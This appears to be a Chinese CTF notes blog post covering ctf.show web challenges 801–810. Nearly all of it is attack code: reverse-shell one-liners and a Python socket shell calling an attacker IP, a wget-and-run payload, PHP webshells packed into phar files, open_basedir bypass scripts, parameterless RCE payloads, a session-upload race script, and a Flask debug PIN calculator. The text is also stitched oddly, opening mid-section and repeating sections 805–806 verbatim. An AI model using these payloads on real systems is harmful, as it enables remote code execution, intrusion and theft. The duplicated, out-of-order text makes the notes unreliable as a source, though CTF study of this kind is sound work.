基本原理是基于报错返回内容的不用，设置自定义的错误处理函数，循环遍历匹配到正则的报错信息的字符来逐个拼接成存在的文件名，另外是需要结合利用Windows下的两个特殊的通配符<和>，不然只能进行暴破。\n\n   ```php\n   <?php\n   ini_set('open_basedir', dirname(__FILE__));\n   printf(\"<b>open_basedir: %s</b><br />\", ini_get('open_basedir'));\n   set_error_handler('isexists');\n   $dir = 'E:/wamp64/';\n   $file = '';\n   $chars = 'abcdefghijklmnopqrstuvwxyz0123456789_';\n   for ($i=0; $i < strlen($chars); $i++) {\n           $file = $dir . $chars[$i] . '<><';\n           realpath($file);\n   }\n   function isexists($errno, $errstr)\n   {\n           $regexp = '/File\\((.*)\\) is not within/';\n           preg_match($regexp, $errstr, $matches);\n           if (isset($matches[1])) {\n                   printf(\"%s <br/>\", $matches[1]);\n           }\n   }\n   ?>\n   ```\n\n   可以看到，首字母不同的文件就被列出来了，首字母相同的文件中只列了第一个：\n\n   ![](https://www.mi1k7ea.com/2019/07/20/浅谈几种Bypass-open-basedir的方法/10.png)\n\n最后是大佬脚本\n\n```php\n<?php\n/*\n* by phithon\n* From https://www.leavesongs.com\n* detail: http://cxsecurity.com/issue/WLB-2009110068\n*/\nheader('content-type: text/plain');\nerror_reporting(-1);\nini_set('display_errors', TRUE);\nprintf(\"open_basedir: %s\\nphp_version: %s\\n\", ini_get('open_basedir'), phpversion());\nprintf(\"disable_functions: %s\\n\", ini_get('disable_functions'));\n$file = str_replace('\\\\', '/', isset($_REQUEST['file']) ? $_REQUEST['file'] : '/etc/passwd');\n$relat_file = getRelativePath(__FILE__, $file);\n$paths = explode('/', $file);\n$name = mt_rand() % 999;\n$exp = getRandStr();\nmkdir($name);\nchdir($name);\nfor($i = 1 ; $i < count($paths) - 1 ; $i++){\n    mkdir($paths[$i]);\n    chdir($paths[$i]);\n}\nmkdir($paths[$i]);\nfor ($i -= 1; $i > 0; $i--) { \n    chdir('..');\n}\n$paths = explode('/', $relat_file);\n$j = 0;\nfor ($i = 0; $paths[$i] == '..'; $i++) { \n    mkdir($name);\n    chdir($name);\n    $j++;\n}\nfor ($i = 0; $i <= $j; $i++) { \n    chdir('..');\n}\n$tmp = array_fill(0, $j + 1, $name);\nsymlink(implode('/', $tmp), 'tmplink');\n$tmp = array_fill(0, $j, '..');\nsymlink('tmplink/' . implode('/', $tmp) . $file, $exp);\nunlink('tmplink');\nmkdir('tmplink');\ndelfile($name);\n$exp = dirname($_SERVER['SCRIPT_NAME']) . \"/{$exp}\";\n$exp = \"http://{$_SERVER['SERVER_NAME']}{$exp}\";\necho \"\\n-----------------content---------------\\n\\n\";\necho file_get_contents($exp);\ndelfile('tmplink');\n\nfunction getRelativePath($from, $to) {\n  // some compatibility fixes for Windows paths\n  $from = rtrim($from, '\\/') . '/';\n  $from = str_replace('\\\\', '/', $from);\n  $to   = str_replace('\\\\', '/', $to);\n\n  $from   = explode('/', $from);\n  $to     = explode('/', $to);\n  $relPath  = $to;\n\n  foreach($from as $depth => $dir) {\n    // find first non-matching dir\n    if($dir === $to[$depth]) {\n      // ignore this directory\n      array_shift($relPath);\n    } else {\n      // get number of remaining dirs to $from\n      $remaining = count($from) - $depth;\n      if($remaining > 1) {\n        // add traversals up to first matching dir\n        $padLength = (count($relPath) + $remaining - 1) * -1;\n        $relPath = array_pad($relPath, $padLength, '..');\n        break;\n      } else {\n        $relPath[0] = './' . $relPath[0];\n      }\n    }\n  }\n  return implode('/', $relPath);\n}\n\nfunction delfile($deldir){\n    if (@is_file($deldir)) {\n        @chmod($deldir,0777);\n        return @unlink($deldir);\n    }else if(@is_dir($deldir)){\n        if(($mydir = @opendir($deldir)) == NULL) return false;\n        while(false !== ($file = @readdir($mydir)))\n        {\n            $name = File_Str($deldir.'/'.$file);\n            if(($file!='.') && ($file!='..')){delfile($name);}\n        } \n        @closedir($mydir);\n        @chmod($deldir,0777);\n        return @rmdir($deldir) ? true : false;\n    }\n}\n\nfunction File_Str($string)\n{\n    return str_replace('//','/',str_replace('\\\\','/',$string));\n}\n\nfunction getRandStr($length = 6) {\n    $chars = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';\n    $randStr = '';\n    for ($i = 0; $i < $length; $i++) {\n        $randStr .= substr($chars, mt_rand(0, strlen($chars) - 1), 1);\n    }\n    return $randStr;\n}\n```\n\ninclude远程文件后传参file即可\n\n**806**\n\n### php无参RCE\n\n首先是一篇可供参考的[文章](https://blog.csdn.net/qq_45570082/article/details/106602261)\n\n利用方式有以下几种\n\n1. **利用session_id**\n\n   php中有一个函数叫session_id(),可以直接获取到cookie中的phpsessionid值，phpsessionid的组成符号有限定,不能使用 ’ () '，所以我们需要将我们要执行的命令转换成16进制，然后再通过hex2bin函数转换回去，`bin2hex('payload');`来转换16禁止，在使用时通过`eval(hex2bin(session_id(session_start())));`，在加上请求头中Cookie中的`PHPSESSID=16进制payload`执行\n\n2. **利用`get_defined_vars ()`函数**\n\n   `get_defined_vars()`：返回由所有已定义变量所组成的数组\n\n   可供利用的函数\n\n   ```php\n   end() - 将内部指针指向数组中的最后一个元素，并输出。\n   next() - 将内部指针指向数组中的下一个元素，并输出。\n   prev() - 将内部指针指向数组中的上一个元素，并输出。\n   reset() - 将内部指针指向数组中的第一个元素，并输出。\n   each() - 返回当前元素的键名和键值，并将内部指针向前移动。\n   ```\n\n   可以看到在已定义的变量中存在着全局变量GET和POST，我们可以通过传入参数来实现RCE\n\n   ```\n   payload:?a=eval(end(current(get_defined_vars())));&b=phpinfo();\n   ```\n\n3. 文件读取\n\n   可供利用的函数\n\n   ```\n   var_dump()  打印所有内容\n   print_r()  同上\n   scandir()  扫描路径内文件名并返回一个迭代器\n   localeconv()  \n   getcwd()  获得当前工作目录\n   getallheaders()  获得请求头内容\n   \n   ```\n\n   \n\n\n\n\n\n\n\n\n\n\n\n\n\n**807**\n\n### 反弹shell\n\n本地监听端口，记住要有公网IP，也可以使用frp内网穿透\n\n1. 公网服务器\n\n   监听命令\n\n   ```\n   攻击端\n   nc -lvp 监听的端口\n   受害端\n   bash -i >& /dev/tcp/攻击端IP/攻击端监听端口 0>&1\n   nc 攻击端IP 攻击端监听端口 -t /bin/bash\n   ```\n\n   利用wget下载执行\n\n   ```\n   wget 攻击端IP/shell.txt -O /tmp/shell.php && php /tmp/shell.php\n   ```\n\n   python脚本反弹\n\n   ```python\n   #!/usr/bin/python\n   #-*- coding: utf-8 -*-\n   import socket,subprocess,os\n   s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)\n   s.connect((\"攻击端IP\",攻击端监听端口)) #更改localhost为⾃⼰的外⽹ip,端⼝任意\n   os.dup2(s.fileno(),0)\n   os.dup2(s.fileno(),1)\n   os.dup2(s.fileno(),2)\n   p=subprocess.call([\"/bin/sh\",\"-i\"])\n   \n   ```\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n**808**\n\n### 卡临时文件包含\n\n```python\nimport requests\nimport threading\nimport sys\nsession=requests.session()\nsess='yu22x'\nurl1=\"http://97ccc0d8-b608-44a0-970b-895263a76d15.challenge.ctf.show/\"\nurl2='http://97ccc0d8-b608-44a0-970b-895263a76d15.challenge.ctf.show/?file=/tmp/sess_yu22x'\ndata1={\n    'PHP_SESSION_UPLOAD_PROGRESS':'<?php eval($_POST[1]);?>'\n}\ndata2={\n    '1':'echo 11123;system(\"cat /*\");',\n}\nfile={\n    'file':'1'\n}\ncookies={\n    'PHPSESSID': sess\n}\ndef write():\n    while True:\n        r = session.post(url1,data=data1,files=file,cookies=cookies)\ndef read():\n    while True:\n        r = session.post(url2,data=data2)\n        if '11123' in r.text:\n            print(r.text)\n\nif __name__==\"__main__\":\n    event=threading.Event()\n    with requests.session() as session:\n        for i in range(1,30): \n            threading.Thread(target=write).start()\n        for i in range(1,30):\n            threading.Thread(target=read).start()\n    event.set()\n```\n\n纯纯看运气\n\n**809**\n\n### pear文件包含/RCE\n\n文章[在此](https://www.leavesongs.com/PENETRATION/docker-php-include-getshell.html)\n\n> pecl是PHP中用于管理扩展而使用的命令行工具，而pear是pecl依赖的类库。在7.3及以前，pecl/pear是默认安装的；在7.4及以后，需要我们在编译PHP的时候指定`--with-pear`才会安装。\n>\n> 不过，在Docker任意版本镜像中，pcel/pear都会被默认安装，安装的路径在`/usr/local/lib/php`。\n>\n> 原本pear/pcel是一个命令行工具，并不在Web目录下，即使存在一些安全隐患也无需担心。但我们遇到的场景比较特殊，是一个文件包含的场景，那么我们就可以包含到pear中的文件，进而利用其中的特性来搞事。\n>\n> 我最早的时候是在阅读phpinfo()的过程中，发现Docker环境下的PHP会开启`register_argc_argv`这个配置。文档中对这个选项的介绍不是特别清楚，大概的意思是，当开启了这个选项，用户的输入将会被赋予给`$argc`、`$argv`、`$_SERVER['argv']`几个变量。\n>\n> 如果PHP以命令行的形式运行（即sapi是cli），这里很好理解。但如果PHP以Server的形式运行，且又开启了`register_argc_argv`，那么这其中是怎么处理的？\n>\n> HTTP数据包中的query-string会被作为argv的值\n\n最终构造的payload如下\n\n```\n?+config-create+/&file=/usr/local/lib/php/pearcmd.php&/<?=phpinfo()?>+/tmp/hello.php\n```\n\n此时/tmp/hello.php文件中就有了我们写入的`<?=phpinfo()?>`，文件包含即可\n\n**810**\n\n### SSRF打PHP-FPM\n\n有工具不用***\n\n```\ntitle: CTFshow常用姿势\ndate: 2022-06-04 16:20:22\ntags:\n```\n\n**801**\n\n### flask计算PIN\n\n**什么是PIN码**\n\nPIN码也就是flask在开启debug模式下，进行代码调试模式的进入密码，需要正确的PIN码才能进入调试模式\n\n**注意事项：谨记！！python 3.8（md5）和3.6（sha1）pin码生成方式不同**\n\n**使用条件：flask debug模式开启 存在任意文件读取**\n\n首先是python PIN码的生成脚本\n\n```\n#生效时间为一周\nPIN_TIME = 60 * 60 * 24 * 7\n\n\ndef hash_pin(pin: str) -> str:\n    return hashlib.sha1(f\"{pin} added salt\".encode(\"utf-8\", \"replace\")).hexdigest()[:12]\n\n\n_machine_id: t.Optional[t.Union[str, bytes]] = None\n\n#获取机器号\ndef get_machine_id() -> t.Optional[t.Union[str, bytes]]:\n    global _machine_id\n\n    if _machine_id is not None:\n        return _machine_id\n\n    def _generate() -> t.Optional[t.Union[str, bytes]]:\n        linux = b\"\"\n\n        # machine-id is stable across boots, boot_id is not.\n        for filename in \"/etc/machine-id\", \"/proc/sys/kernel/random/boot_id\":\n            try:\n                with open(filename, \"rb\") as f:\n                    value = f.readline().strip()\n            except OSError:\n                continue\n\n            if value:\n            #读取文件进行拼接\n                linux += value\n                break\n\n        # Containers share the same machine id, add some cgroup\n        # information. This is used outside containers too but should be\n        # relatively stable across boots.\n        try:\n            with open(\"/proc/self/cgroup\", \"rb\") as f:\n            #继续进行拼接，这里处理一下只要/docker后的东西\n                linux += f.readline().strip().rpartition(b\"/\")[2]\n        except OSError:\n            pass\n\n        if linux:\n            return linux\n\n        # On OS X, use ioreg to get the computer's serial number.\n        try:\n            # subprocess may not be available, e.g. Google App Engine\n            # https://github.com/pallets/werkzeug/issues/925\n            from subprocess import Popen, PIPE\n\n            dump = Popen(\n                [\"ioreg\", \"-c\", \"IOPlatformExpertDevice\", \"-d\", \"2\"], stdout=PIPE\n            ).communicate()[0]\n            match = re.search(b'\"serial-number\" = <([^>]+)', dump)\n\n            if match is not None:\n                return match.group(1)\n        except (OSError, ImportError):\n            pass\n\n        # On Windows, use winreg to get the machine guid.\n        if sys.platform == \"win32\":\n            import winreg\n\n            try:\n                with winreg.OpenKey(\n                    winreg.HKEY_LOCAL_MACHINE,\n                    \"SOFTWARE\\\\Microsoft\\\\Cryptography\",\n                    0,\n                    winreg.KEY_READ | winreg.KEY_WOW64_64KEY,\n                ) as rk:\n                    guid: t.Union[str, bytes]\n                    guid_type: int\n                    guid, guid_type = winreg.QueryValueEx(rk, \"MachineGuid\")\n\n                    if guid_type == winreg.REG_SZ:\n                        return guid.encode(\"utf-8\")\n\n                    return guid\n            except OSError:\n                pass\n\n        return None\n\n    _machine_id = _generate()\n    return _machine_id\n\n\nclass _ConsoleFrame:\n    \"\"\"Helper class so that we can reuse the frame console code for the\n    standalone console.\n    \"\"\"\n\n    def __init__(self, namespace: t.Dict[str, t.Any]):\n        self.console = Console(namespace)\n        self.id = 0\n\n\ndef get_pin_and_cookie_name(\n    app: \"WSGIApplication\",\n) -> t.Union[t.Tuple[str, str], t.Tuple[None, None]]:\n    \"\"\"Given an application object this returns a semi-stable 9 digit pin\n    code and a random key.  The hope is that this is stable between\n    restarts to not make debugging particularly frustrating.  If the pin\n    was forcefully disabled this returns `None`.\n\n    Second item in the resulting tuple is the cookie name for remembering.\n    \"\"\"\n    pin = os.environ.get(\"WERKZEUG_DEBUG_PIN\")\n    rv = None\n    num = None\n\n    # Pin was explicitly disabled\n    if pin == \"off\":\n        return None, None\n\n    # Pin was provided explicitly\n    if pin is not None and pin.replace(\"-\", \"\").isdigit():\n        # If there are separators in the pin, return it directly\n        if \"-\" in pin:\n            rv = pin\n        else:\n            num = pin\n\n    modname = getattr(app, \"__module__\", t.cast(object, app).__class__.__module__)\n    username: t.Optional[str]\n\n    try:\n        # getuser imports the pwd module, which does not exist in Google\n        # App Engine. It may also raise a KeyError if the UID does not\n        # have a username, such as in Docker.\n        username = getpass.getuser()\n    except (ImportError, KeyError):\n        username = None\n\n    mod = sys.modules.get(modname)\n\n    # This information only exists to make the cookie unique on the\n    # computer, not as a security feature.\n    probably_public_bits = [\n        username,\n        modname,\n        getattr(app, \"__name__\", type(app).__name__),\n        getattr(mod, \"__file__\", None),\n    ]\n\n    # This information is here to make it harder for an attacker to\n    # guess the cookie name.  They are unlikely to be contained anywhere\n    # within the unauthenticated debug page.\n    private_bits = [str(uuid.getnode()), get_machine_id()]\n\n    h = hashlib.sha1()\n    for bit in chain(probably_public_bits, private_bits):\n        if not bit:\n            continue\n        if isinstance(bit, str):\n            bit = bit.encode(\"utf-8\")\n        h.update(bit)\n    h.update(b\"cookiesalt\")\n\n    cookie_name = f\"__wzd{h.hexdigest()[:20]}\"\n\n    # If we need to generate a pin we salt it a bit more so that we don't\n    # end up with the same value and generate out 9 digits\n    if num is None:\n        h.update(b\"pinsalt\")\n        num = f\"{int(h.hexdigest(), 16):09d}\"[:9]\n\n    # Format the pincode in groups of digits for easier remembering if\n    # we don't have a result yet.\n    if rv is None:\n        for group_size in 5, 4, 3:\n            if len(num) % group_size == 0:\n                rv = \"-\".join(\n                    num[x : x + group_size].rjust(group_size, \"0\")\n                    for x in range(0, len(num), group_size)\n                )\n                break\n        else:\n            rv = num\n\n    return rv, cookie_name\n```\n\n由上可以看得出PIN值生成所需要获取的数据有\n\n- username，用户名\n- modname，默认值为flask.app\n- appname，默认值为Flask\n- moddir，flask库下app.py的绝对路径\n- uuidnode，当前网络的mac地址的十进制数\n- machine_id，docker机器id或本机id\n\n首先是用户名\n\n![img](https://jlan-blog.oss-cn-beijing.aliyuncs.com/202206041655129.png)\n\n可用的似乎只有root\n\n下面三项任意报错即可获得\n\nmac地址\n\n![img](https://jlan-blog.oss-cn-beijing.aliyuncs.com/202206041659777.png)\n\nMachine_id\n\n![img](https://jlan-blog.oss-cn-beijing.aliyuncs.com/202206041701195.png)\n\n本机生成脚本如下\n\n```\n#MD5\nimport hashlib\nfrom itertools import chain\nprobably_public_bits = [\n     'flaskweb'# username\n     'flask.app',# modname\n     'Flask',# getattr(app, '__name__', getattr(app.__class__, '__name__'))\n     '/usr/local/lib/python3.7/site-packages/flask/app.py' # getattr(mod, '__file__', None),\n]\n\nprivate_bits = [\n     '25214234362297',# str(uuid.getnode()),  /sys/class/net/ens33/address\n     '0402a7ff83cc48b41b227763d03b386cb5040585c82f3b99aa3ad120ae69ebaa'# get_machine_id(), /etc/machine-id\n]\n\nh = hashlib.md5()\nfor bit in chain(probably_public_bits, private_bits):\n    if not bit:\n        continue\n    if isinstance(bit, str):\n        bit = bit.encode('utf-8')\n    h.update(bit)\nh.update(b'cookiesalt')\n\ncookie_name = '__wzd' + h.hexdigest()[:20]\n\nnum = None\nif num is None:\n   h.update(b'pinsalt')\n   num = ('%09d' % int(h.hexdigest(), 16))[:9]\n\nrv =None\nif rv is None:\n   for group_size in 5, 4, 3:\n       if len(num) % group_size == 0:\n          rv = '-'.join(num[x:x + group_size].rjust(group_size, '0')\n                      for x in range(0, len(num), group_size))\n          break\n       else:\n          rv = num\n\nprint(rv)\n#sha1\nimport hashlib\nfrom itertools import chain\nprobably_public_bits = [\n    'root'# /etc/passwd\n    'flask.app',# 默认值\n    'Flask',# 默认值\n    '/usr/local/lib/python3.8/site-packages/flask/app.py' # 报错得到\n]\n\nprivate_bits = [\n    '2485377581187',#  /sys/class/net/eth0/address 16进制转10进制\n    #machine_id由三个合并(docker就后两个)：1./etc/machine-id 2./proc/sys/kernel/random/boot_id 3./proc/self/cgroup\n    '653dc458-4634-42b1-9a7a-b22a082e1fce55d22089f5fa429839d25dcea4675fb930c111da3bb774a6ab7349428589aefd'#  /proc/self/cgroup\n]\n\nh = hashlib.sha1()\nfor bit in chain(probably_public_bits, private_bits):\n    if not bit:\n        continue\n    if isinstance(bit, str):\n        bit = bit.encode('utf-8')\n    h.update(bit)\nh.update(b'cookiesalt')\n\ncookie_name = '__wzd' + h.hexdigest()[:20]\n\nnum = None\nif num is None:\n    h.update(b'pinsalt')\n    num = ('%09d' % int(h.hexdigest(), 16))[:9]\n\nrv =None\nif rv is None:\n    for group_size in 5, 4, 3:\n        if len(num) % group_size == 0:\n            rv = '-'.join(num[x:x + group_size].rjust(group_size, '0')\n                          for x in range(0, len(num), group_size))\n            break\n    else:\n        rv = num\n\nprint(rv)\n```\n\n使用最终生成的PIN进入代码调试，RCE\n\n**802**\n\n### 无字母数字命令执行\n\n异或法，偷个脚本喵喵\n\n```\n<?php\n\n/*author yu22x*/\n\n$myfile = fopen(\"xor_rce.txt\", \"w\");\n$contents=\"\";\nfor ($i=0; $i < 256; $i++) {\n    for ($j=0; $j <256 ; $j++) {\n\n        if($i<16){\n            $hex_i='0'.dechex($i);\n        }\n        else{\n            $hex_i=dechex($i);\n        }\n        if($j<16){\n            $hex_j='0'.dechex($j);\n        }\n        else{\n            $hex_j=dechex($j);\n        }\n        $preg = '/[a-z0-9]/i'; //根据题目给的正则表达式修改即可\n        if(preg_match($preg , hex2bin($hex_i))||preg_match($preg , hex2bin($hex_j))){\n            echo \"\";\n        }\n\n        else{\n            $a='%'.$hex_i;\n            $b='%'.$hex_j;\n            $c=(urldecode($a)^urldecode($b));\n            if (ord($c)>=32&ord($c)<=126) {\n                $contents=$contents.$c.\" \".$a.\" \".$b.\"\\n\";\n            }\n        }\n\n    }\n}\nfwrite($myfile,$contents);\nfclose($myfile);\n\n# -*- coding: utf-8 -*-\n\n# author yu22x\n\nimport requests\nimport urllib\nfrom sys import *\nimport os\ndef action(arg):\n   s1=\"\"\n   s2=\"\"\n   for i in arg:\n       f=open(\"xor_rce.txt\",\"r\")\n       while True:\n           t=f.readline()\n           if t==\"\":\n               break\n           if t[0]==i:\n               #print(i)\n               s1+=t[2:5]\n               s2+=t[6:9]\n               break\n       f.close()\n   output=\"(\\\"\"+s1+\"\\\"^\\\"\"+s2+\"\\\")\"\n   return(output)\n   \nwhile True:\n   param=action(input(\"\\n[+] your function：\") )+action(input(\"[+] your command：\"))+\";\"\n   print(param)\n```\n\n**803**\n\n### phar文件包含\n\n来自大佬的提示：把phar当压缩包用就行\n\n首先生成包含一句话木马的phar文件\n\n```\n<?php\n$phar = new Phar(\"phar.phar\"); //后缀名必须为phar\n$phar->startBuffering();\n$phar->setStub('<?php __HALT_COMPILER(); ?>'); //设置stub\n$phar->addFromString('test.txt', '<?php system($_POST[a]);?>'); //\n$phar->stopBuffering();\n// phar生成\n?>\n```\n\n此时phar包中的test.txt中的内容就是我们的一句话木马了\n\n上传文件（记得读取然后url编码一下）\n\n```\npayload:?file=/tmp/phar.phar&content=%3C%3Fphp+__HALT_COMPILER%28%29%3B+%3F%3E%0D%0A6%00%00%00%01%00%00%00%11%00%00%00%01%00%00%00%00%00%00%00%00%00%08%00%00%00test.txt%1A%00%00%00%7E%E7%9Db%1A%00%00%00%C8%C2%DA%2C%A4%01%00%00%00%00%00%00%3C%3Fphp+system%28%24_POST%5Ba%5D%29%3B%3F%3E%FB%C1%FC%A84J%19%C8f%97%29%BA%C7%80v%82%F5%86J%06%02%00%00%00GBMB\n```\n\ninclude干\n\n![截屏2022-06-06 20.00.48](file:///Users/jlan/Library/Application%20Support/typora-user-images/%E6%88%AA%E5%B1%8F2022-06-06%2020.00.48.png?lastModify=1654679483)\n\n**804**\n\n### phar反序列化\n\n这不用教吧\n\n```\n<?php\nclass hacker{\n    public $code;\n}\n\n// @unlink(\"phar.phar\");\n$phar = new Phar(\"phar.phar\"); //后缀名必须为phar\n// $phar = $phar->convertToExecutable(Phar::TAR, Phar::GZ); //压缩规避敏感字符\n$phar->startBuffering();\n$phar->setStub(\"GIF89a\".\"<?php __HALT_COMPILER(); ?>\"); //设置stub\n$o = new hacker();\n$o->code=\"highlight_file('flag.php');\";\n$phar->setMetadata($o); //将自定义的meta-data存入manifest\n$phar->addFromString(\"test.txt\", \"test\"); //添加要压缩的文件\n//签名自动计算\n$phar->stopBuffering();\n// phar生成\n\n?>\n```\n\n上传phar协议读取就行\n\n**805**\n\n### open_basedir绕过\n\n> open_basedir是php.ini中的一个配置选项，可用于将用户访问文件的活动范围限制在指定的区域。\n>\n> 假设open_basedir=/var/www/html/web1/:/tmp/，那么通过web1访问服务器的用户就无法获取服务器上除了/var/www/html/web1/和/tmp/这两个目录以外的文件。\n>\n> 注意：用open_basedir指定的**限制实际上是前缀，而不是目录名**。\n>\n> 文章来自[这里](https://www.cnblogs.com/hookjoy/p/12846164.html)\n\n但是这个配置对系统命令执行是没有效果的，比如执行`system('ls /')`的时候就不受限制，~~但是一般都会被ban掉~~\n\n下面就是一些bypass方法\n\n1. glob协议，只能捞捞文件名\n\n   ```\n     $a = \"glob:///*\";\n     if ( $b = opendir($a) ) {\n       while ( ($file = readdir($b)) !== false ) {\n         echo $file.\"\\n\";\n       }\n       closedir($b);\n     }\n   ```\n\n2. 利用chdir()与ini_set()组合Bypass\n\n   原理在这里\n\n   ```\n   mkdir(\"s\");\n   chdir('s');\n   ini_set('open_basedir','..');\n   chdir('..');\n   chdir('..');\n   chdir('..');\n   chdir('..');\n   ini_set('open_basedir','/');\n   echo file_get_contents(\"/ctfshowflag\");\n   ```\n\n3. 利用bindtextdomain()函数Bypass\n\n   这个方法也只能捞捞文件名\n\n   > **bindtextdomain()函数**\n   >\n   > (PHP 4, PHP 5, PHP 7)\n   >\n   > bindtextdomain()函数用于绑定domain到某个目录的函数。\n   >\n   > ```\n   > bindtextdomain ( string $domain , string $directory ) : string\n   > ```\n   >\n   > bindtextdomain()函数的第二个参数$directory是一个文件路径，它会在$directory存在的时候返回$directory，不存在则返回false。\n\n   我们就可以通过修改directory参数根据返回值来判断文件是否存在\n\n4. 利用SplFileInfo::getRealPath()类方法Bypass\n\n   这个和上面那个很相似，也是基于报错，直接给payload吧\n\n   ```\n   <?php\n   echo '<b>open_basedir: ' . ini_get('open_basedir') . '</b><br />';\n   $info = new SplFileInfo($_GET['dir']);\n   var_dump($info->getRealPath());\n   ?>\n   ```\n\n5. 利用realpath()函数Bypass\n\n   > ### realpath()函数\n   >\n   > (PHP 4, PHP 5, PHP 7)\n   >\n   > realpath — 返回规范化的绝对路径名。它可以去掉多余的../或./等跳转字符，能将相对路径转换成绝对路径。\n   >\n   > 函数定义如下：\n   >\n   > ```\n   > realpath ( string $path ) : string\n   > ```\n   >\n   > ### Bypass\n   >\n   > 环境条件：Windows\n   >\n   > 基本原理是基于报错返回内容的不用，设置自定义的错误处理函数，循环遍历匹配到正则的报错信息的字符来逐个拼接成存在的文件名，另外是需要结合利用Windows下的两个特殊的通配符<和>，不然只能进行暴破。\n\n   ```\n   <?php\n   ini_set('open_basedir', dirname(__FILE__));\n   printf(\"<b>open_basedir: %s</b><br />\", ini_get('open_basedir'));\n   set_error_handler('isexists');\n   $dir = 'E:/wamp64/';\n   $file = '';\n   $chars = 'abcdefghijklmnopqrstuvwxyz0123456789_';\n   for ($i=0; $i < strlen($chars); $i++) {\n           $file = $dir . $chars[$i] . '<><';\n           realpath($file);\n   }\n   function isexists($errno, $errstr)\n   {\n           $regexp = '/File\\((.*)\\) is not within/';\n           preg_match($regexp, $errstr, $matches);\n           if (isset($matches[1])) {\n                   printf(\"%s <br/>\", $matches[1]);\n           }\n   }\n   ?>\n   ```\n\n   可以看到，首字母不同的文件就被列出来了，首字母相同的文件中只列了第一个：\n\n   ![img](https://www.mi1k7ea.com/2019/07/20/%E6%B5%85%E8%B0%88%E5%87%A0%E7%A7%8DBypass-open-basedir%E7%9A%84%E6%96%B9%E6%B3%95/10.png)\n\n最后是大佬脚本\n\n```\n<?php\n/*\n* by phithon\n* From https://www.leavesongs.com\n* detail: http://cxsecurity.com/issue/WLB-2009110068\n*/\nheader('content-type: text/plain');\nerror_reporting(-1);\nini_set('display_errors', TRUE);\nprintf(\"open_basedir: %s\\nphp_version: %s\\n\", ini_get('open_basedir'), phpversion());\nprintf(\"disable_functions: %s\\n\", ini_get('disable_functions'));\n$file = str_replace('\\\\', '/', isset($_REQUEST['file']) ? $_REQUEST['file'] : '/etc/passwd');\n$relat_file = getRelativePath(__FILE__, $file);\n$paths = explode('/', $file);\n$name = mt_rand() % 999;\n$exp = getRandStr();\nmkdir($name);\nchdir($name);\nfor($i = 1 ; $i < count($paths) - 1 ; $i++){\n    mkdir($paths[$i]);\n    chdir($paths[$i]);\n}\nmkdir($paths[$i]);\nfor ($i -= 1; $i > 0; $i--) { \n    chdir('..');\n}\n$paths = explode('/', $relat_file);\n$j = 0;\nfor ($i = 0; $paths[$i] == '..'; $i++) { \n    mkdir($name);\n    chdir($name);\n    $j++;\n}\nfor ($i = 0; $i <= $j; $i++) { \n    chdir('..');\n}\n$tmp = array_fill(0, $j + 1, $name);\nsymlink(implode('/', $tmp), 'tmplink');\n$tmp = array_fill(0, $j, '..');\nsymlink('tmplink/' . implode('/', $tmp) . $file, $exp);\nunlink('tmplink');\nmkdir('tmplink');\ndelfile($name);\n$exp = dirname($_SERVER['SCRIPT_NAME']) . \"/{$exp}\";\n$exp = \"http://{$_SERVER['SERVER_NAME']}{$exp}\";\necho \"\\n-----------------content---------------\\n\\n\";\necho file_get_contents($exp);\ndelfile('tmplink');\n\nfunction getRelativePath($from, $to) {\n  // some compatibility fixes for Windows paths\n  $from = rtrim($from, '\\/') . '/';\n  $from = str_replace('\\\\', '/', $from);\n  $to   = str_replace('\\\\', '/', $to);\n\n  $from   = explode('/', $from);\n  $to     = explode('/', $to);\n  $relPath  = $to;\n\n  foreach($from as $depth => $dir) {\n    // find first non-matching dir\n    if($dir === $to[$depth]) {\n      // ignore this directory\n      array_shift($relPath);\n    } else {\n      // get number of remaining dirs to $from\n      $remaining = count($from) - $depth;\n      if($remaining > 1) {\n        // add traversals up to first matching dir\n        $padLength = (count($relPath) + $remaining - 1) * -1;\n        $relPath = array_pad($relPath, $padLength, '..');\n        break;\n      } else {\n        $relPath[0] = './' . $relPath[0];\n      }\n    }\n  }\n  return implode('/', $relPath);\n}\n\nfunction delfile($deldir){\n    if (@is_file($deldir)) {\n        @chmod($deldir,0777);\n        return @unlink($deldir);\n    }else if(@is_dir($deldir)){\n        if(($mydir = @opendir($deldir)) == NULL) return false;\n        while(false !== ($file = @readdir($mydir)))\n        {\n            $name = File_Str($deldir.'/'.$file);\n            if(($file!='.') && ($file!='..')){delfile($name);}\n        } \n        @closedir($mydir);\n        @chmod($deldir,0777);\n        return @rmdir($deldir) ? true : false;\n    }\n}\n\nfunction File_Str($string)\n{\n    return str_replace('//','/',str_replace('\\\\','/',$string));\n}\n\nfunction getRandStr($length = 6) {\n    $chars = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';\n    $randStr = '';\n    for ($i = 0; $i < $length; $i++) {\n        $randStr .= substr($chars, mt_rand(0, strlen($chars) - 1), 1);\n    }\n    return $randStr;\n}\n```\n\ninclude远程文件后传参file即可\n\n**806**\n\n### php无参RCE\n\n首先是一篇可供参考的[文章](https://blog.csdn.net/qq_45570082/article/details/106602261)\n\n利用方式有以下几种\n\n1. **利用session_id**\n\n   php中有一个函数叫session_id(),可以直接获取到cookie中的phpsessionid值，phpsessionid的组成符号有限定,不能使用 ’ () '，所以我们需要将我们要执行的命令转换成16进制，然后再通过hex2bin函数转换回去，`bin2hex('payload');`来转换16禁止，在使用时通过`eval(hex2bin(session_id(session_start())));`，在加上请求头中Cookie中的`PHPSESSID=16进制payload`执行\n\n2. **利用`get_defined_vars ()`函数**\n\n   `get_defined_vars()`：返回由所有已定义变量所组成的数组\n\n   可供利用的函数\n\n   ```\n   end() - 将内部指针指向数组中的最后一个元素，并输出。\n   next() - 将内部指针指向数组中的下一个元素，并输出。\n   prev() - 将内部指针指向数组中的上一个元素，并输出。\n   reset() - 将内部指针指向数组中的第一个元素，并输出。\n   each() - 返回当前元素的键名和键值，并将内部指针向前移动。\n   ```\n\n   可以看到在已定义的变量中存在着全局变量GET和POST，我们可以通过传入参数来实现RCE\n\n   ```\n   payload:?a=eval(end(current(get_defined_vars())));&b=phpinfo();\n   ```\n\n3. 文件读取\n\n   可供利用的函数\n\n   ```\n   var_dump()  打印所有内容\n   print_r()  同上\n   scandir()  扫描路径内文件名并返回一个迭代器\n   localeconv()  \n   getcwd()  获得当前工作目录\n   getallheaders()  获得请求头内容\n   \n   ```\n\n   